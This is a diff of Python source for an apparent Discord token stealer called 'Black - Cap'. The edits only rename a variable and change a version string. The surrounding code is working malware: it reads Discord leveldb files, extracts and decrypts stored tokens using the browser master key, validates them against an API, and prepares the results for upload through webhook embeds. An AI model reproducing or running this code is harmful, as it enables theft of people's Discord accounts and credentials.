@@ -571,10 +571,10 @@ class bl4ckc4p(Functions):
             disc = name.replace(" ", "").lower()
             if "cord" in path:
                 if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
-                    for file_name in os.listdir(path):
-                        if file_name[-3:] not in ["log", "ldb"]:
+                    for filname in os.listdir(path):
+                        if filname[-3:] not in ["log", "ldb"]:
                             continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                             for y in re.findall(self.encrypted_regex, line):
                                 try:
                                     token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
@@ -593,10 +593,10 @@ class bl4ckc4p(Functions):
                                         self.tokens.append(token)
                                         self.ids.append(uid)
             else:
-                for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]:
+                for filname in os.listdir(path):
+                    if filname[-3:] not in ["log", "ldb"]:
                         continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for line in [x.strip() for x in open(f'{path}\\{filname}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
                             try:
                                 r = requests.get(self.baseurl, headers={
@@ -638,8 +638,8 @@ class bl4ckc4p(Functions):
                                     
 
     def randomdircreator(self, _dir: str or os.PathLike = gettempdir()):
-        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
-        path = os.path.join(_dir, file_name)
+        filname = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
+        path = os.path.join(_dir, filname)
         open(path, "x")
         return path
 
@@ -1256,7 +1256,7 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Black - Cap v2.2',
+                'name': f'Black - Cap v1.9',
                 'url': 'https://github.com/KSCHdsc',
                 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
             },
@@ -1294,7 +1294,7 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Black - Cap v2.2',
+                'name': f'Black - Cap v1.9',
                 'url': 'https://github.com/KSCHdsc',
                 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
             },
@@ -1326,7 +1326,7 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Black - Cap v2.2',
+                'name': f'Black - Cap v1.9',
                 'url': 'https://github.com/KSCHdsc',
                 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
             },
